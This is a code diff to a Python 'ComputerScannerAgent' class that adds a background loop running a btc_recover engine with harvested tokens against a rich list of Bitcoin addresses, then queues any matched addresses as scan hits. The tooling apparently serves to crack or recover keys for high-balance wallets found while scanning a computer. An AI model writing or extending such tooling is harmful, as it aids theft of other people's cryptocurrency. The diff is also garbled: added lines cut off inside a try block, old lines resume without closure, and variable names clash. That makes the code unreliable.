@@ -235,6 +235,30 @@ class ComputerScannerAgent:
             self._recovery_event.set()
 
     def _recovery_loop(self):
+        """
+        Background recovery loop that triggers btc_recover logic.
+        """
+        print("[ComputerScanner] Recovery loop started")
+        while self.is_running:
+            # Wait for event or periodic timeout (10 mins)
+            self._recovery_event.wait(timeout=600)
+            if not self.is_running: break
+
+            # Reset event
+            self._recovery_event.clear()
+
+            # Respect PAUSE
+            while self.is_paused and self.is_running:
+                time.sleep(1)
+
+            if not self.btc_recover_tokens or not self._richlist:
+                continue
+
+            print(f"[ComputerScanner] Triggering recovery pass with {len(self.btc_recover_tokens)} tokens")
+
+            with self._recovery_lock:
+                try:
+                    # Execute exhaustive recovery engine
         print("[ComputerScanner] Recovery engine loop started")
         while self.is_running:
             # Wait for intelligence or periodic timeout
@@ -285,6 +309,22 @@ class ComputerScannerAgent:
                         workers=os.cpu_count() or 4
                     )
 
+                    self.stats["recovery_attempts"] += results.get("attempts", 0)
+
+                    if results.get("found"):
+                        for match in results.get("matches", []):
+                            self.stats["recovery_matches"] += 1
+                            self._hit_queue.put(ScanHit(
+                                artifact_type=f"Recovery Match ({match.get('type')})",
+                                path="DEEP_SEARCH",
+                                addresses={match.get('coin', 'btc').lower(): match.get('address')},
+                                balances={},
+                                metadata=match,
+                                timestamp=datetime.now(timezone.utc)
+                            ))
+                            print(f"[ComputerScanner] RECOVERY MATCH FOUND: {match.get('address')}")
+                except Exception as e:
+                    print(f"[ComputerScanner] Recovery pass error: {e}")
                     self.stats["recovery_attempts"] += res.get("attempts", 0)
 
                     if res["found"]:
